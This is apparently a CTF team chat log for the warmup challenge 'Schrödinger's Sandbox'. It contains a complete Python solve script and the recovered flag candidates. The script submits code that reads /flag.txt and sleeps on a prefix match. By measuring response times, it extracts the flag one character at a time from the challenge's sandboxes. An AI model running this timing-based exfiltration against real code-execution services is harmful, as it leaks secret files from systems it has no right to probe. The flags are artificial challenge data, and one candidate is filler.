# warmup - Delicious Looking ProblemSchrödinger's Sandbox

Recovered candidates:

Sandbox A flag: 0xfun{schr0d1ng3r_c4t_l34ks_thr0ugh_t1m3}
Sandbox B flag: 0xfun{qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq}
Ha1qal
ha1qal
Idle

REUN1ONB0T
APP
 — 13/2/2026 11:01 PM
Schrödinger's Sandbox | warmup
Created by @Zeqzoq

Use /solved when done
Zeqzoq

Role icon, 🥷 Ninja — 13/2/2026 11:01 PM
import hashlib
import json
import time
import string
import statistics
import requests

message.txt
5 KB
Recovered candidates:
Sandbox A flag: 0xfun{schr0d1ng3r_c4t_l34ks_thr0ugh_t1m3}
Sandbox B flag: 0xfun{qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq}
REUN1ONB0T
 changed the channel name: [warmup] Schrödinger's Sandbox [SOLVED] — 13/2/2026 11:02 PM
REUN1ONB0T
APP
 — 13/2/2026 11:02 PM
SOLVED by @Zeqzoq in 38s
>writeup cat:warmup title:Delicious Looking ProblemSchrödinger's Sandbox
﻿
import hashlib
import json
import time
import string
import statistics
import requests

BASE = "http://chall.0xfun.org:53792"
URL = BASE + "/api/submit"

DIFFICULTY = 4                 # must match computePow(4)
SLEEP_SECS = 1.5               # big enough to stand out, but under 5s timeout
SAMPLES_PER_GUESS = 2          # increase if your network is noisy
THRESHOLD = 0.6                # seconds difference to call it "definitely slower"

# Candidate charset (tweak if needed)
CAND = string.ascii_letters + string.digits + "_{}-!@#$%^&*().,:;?/+=<>[]|~"

session = requests.Session()

def pow_nonce(difficulty=4):
    target = "0" * difficulty
    # keep it simple: just search integers
    i = 0
    while True:
        s = f"{int(time.time()*1000)}-{i}"
        h = hashlib.sha256(s.encode()).hexdigest()
        if h.startswith(target):
            return s
        i += 1

def run_code(code: str):
    nonce = pow_nonce(DIFFICULTY)
    r = session.post(
        URL,
        headers={"Content-Type": "application/json", "X-Pow-Nonce": nonce},
        data=json.dumps({"code": code}),
        timeout=15,
    )
    r.raise_for_status()
    return r.json()

def measure(prefix: str):
    # code: if flag startswith prefix -> sleep
    code = f"""
import time
flag = open("/flag.txt","r").read()
if flag.startswith({prefix!r}):
    time.sleep({SLEEP_SECS})
"""
    ta, tb = [], []
    for _ in range(SAMPLES_PER_GUESS):
        data = run_code(code)
        ta.append(float(data["time_a"]))
        tb.append(float(data["time_b"]))
    return statistics.median(ta), statistics.median(tb)

def main():
    # We'll recover BOTH flags: one for sandbox A and one for sandbox B.
    prefA = ""
    prefB = ""

    # Often flags end with '}', so we can stop when both do.
    for pos in range(1, 200):
        # If both ended, stop
        if prefA.endswith("}") and prefB.endswith("}"):
            break

        foundA = None
        foundB = None

        # If one ended, keep extending the other
        activeA = not prefA.endswith("}")
        activeB = not prefB.endswith("}")

        for ch in CAND:
            guessA = prefA + ch if activeA else prefA
            guessB = prefB + ch if activeB else prefB

            # When both are active, we test the *same* candidate appended to both prefixes
            # by probing each prefix separately (two requests) to avoid ambiguity.
            # This is simpler and very reliable.

            if activeA:
                ta, tb = measure(guessA)
                if ta - tb > THRESHOLD:
                    foundA = ch
                elif tb - ta > THRESHOLD:
                    # means sandbox B matched guessA; that’s still useful, but we’re tracking A’s prefix here
                    pass
                # If both sleep, ta and tb will both be large and delta small; that means both match.
                # In that case, guessA is a prefix of both flags, so it can be used for either.
                if ta > SLEEP_SECS and tb > SLEEP_SECS and abs(ta - tb) < THRESHOLD:
                    # shared prefix case: both flags share prefA+ch so far
                    foundA = ch
                    if activeB and prefB == prefA:
                        foundB = ch

            if activeB and foundB is None:
                ta, tb = measure(guessB)
                if tb - ta > THRESHOLD:
                    foundB = ch
                elif ta - tb > THRESHOLD:
                    pass
                if ta > SLEEP_SECS and tb > SLEEP_SECS and abs(ta - tb) < THRESHOLD:
                    foundB = ch
                    if activeA and prefA == prefB:
                        foundA = ch

            # If we found both next chars (or the ones that are active), stop searching
            if (not activeA or foundA is not None) and (not activeB or foundB is not None):
                break

        if activeA and foundA is None:
            print(f"[pos {pos}] Could not extend A prefix. Try expanding charset or raising SAMPLES/THRESHOLD.")
            break
        if activeB and foundB is None:
            print(f"[pos {pos}] Could not extend B prefix. Try expanding charset or raising SAMPLES/THRESHOLD.")
            break

        if activeA and foundA is not None:
            prefA += foundA
        if activeB and foundB is not None:
            prefB += foundB

        print(f"[pos {pos}] A: {prefA!r}")
        print(f"[pos {pos}] B: {prefB!r}")
        print("-" * 60)

    print("\nRecovered candidates:")
    print("Sandbox A flag:", prefA)
    print("Sandbox B flag:", prefB)
    print("\nSubmit both to the CTF scoreboard; one will be the real flag.")

if __name__ == "__main__":
    main()
message.txt
5 KB

Solved by: ha1qal